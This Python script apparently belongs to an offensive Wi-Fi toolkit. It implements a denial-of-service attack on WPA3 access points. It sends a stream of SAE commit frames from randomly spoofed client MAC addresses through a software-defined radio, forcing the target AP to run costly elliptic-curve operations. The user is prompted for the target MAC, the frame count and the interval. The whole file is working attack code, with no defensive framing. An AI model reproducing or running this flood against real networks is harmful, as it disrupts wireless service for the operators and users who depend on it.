import utils
import random
import time
from SDRtransmitTCP import transmitData
from attack.frames.sae_commit_frame import commit_frame


def random_mac():
    """Generate a random spoofed client MAC."""
    mac = [0x02 | random.randint(0, 1)] + [random.randint(0, 255) for _ in range(5)]
    return ':'.join(f'{b:02x}' for b in mac)

def flood_sae_commits(ap_mac:str, count:int=200, inter:float=0.01):
    """
    Send 'count' SAE commit frames from random STA MACs to the given AP MAC.
    Each frame forces the AP to run hash-to-curve (expensive ECC operation).
    """
    print(f"[*] Flooding {ap_mac} with {count} SAE commit frames")
    for i in range(count):
        src = random_mac()
        frame_bytes = commit_frame(target_mac=ap_mac, src_mac=src)
        print(frame_bytes)
        transmitData(frame_bytes)
        time.sleep(inter)

def start_dos():
    print("which mac do you want to target (leave empty for default AP MAC): ")
    target = input("MAC: ")

    if target == "":
        ap_mac = utils.get_mac("TrustedAP")[0]
    else:
        ap_mac = target

    count = int(input("how many commits to send?: "))
    inter = float(input("enter interval between frames: "))
    flood_sae_commits(ap_mac, count, inter)
